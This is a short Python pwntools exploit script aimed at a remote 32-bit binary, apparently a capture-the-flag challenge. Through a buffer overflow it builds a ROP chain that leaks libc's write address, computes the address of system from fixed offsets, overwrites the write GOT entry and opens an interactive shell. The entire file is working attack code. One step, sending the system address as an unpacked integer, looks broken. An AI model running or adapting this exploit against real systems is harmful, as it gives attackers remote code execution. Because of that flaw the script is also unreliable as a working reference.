#!/usr/bin/python3

from pwn import *

write_plt = 0x080490b4
write_got = 0x804c018
read_plt = 0x08049084
ed_string = 0x80482c5

#libc offsets
offset___libc_start_main_ret = 0x1f08e
offset_puts = 0x00071380
offset_system = 0x045960
offset_dup2 = 0x000f5f50
offset_read = 0x0f5700
offset_write = 0x0f57c0
offset_str_bin_sh = 0x195c69

#ROPgadgets
pop_pop_pop_ret = 0x080492b1

# For privacy conerns, the IP and PORT are not listed.
def main():
    p = remote("IP", PORT)

    payload = b"A" * 37

    payload += p32(write_plt)
    payload += p32(1)
    payload += p32(write_got)
    payload += p32(4)
    payload += p32(read_plt)
    payload += p32(pop_pop_pop_ret)
    payload += p32(0)
    payload += p32(write_got)
    payload += p32(4)

    payload += p32(write_plt)
    payload += p32(0xdeadbeef)
    payload += p32(ed_string)

    p.send(payload)

    p.recv(37)
    data = p.recv()
    write_libc = u32(data)

    libc_start_addr = write_libc - offset_write
    system_libc = libc_start_addr + offset_system

    p.send(system_libc)

    p.interactive()

if __name__ == "__main__":
    main()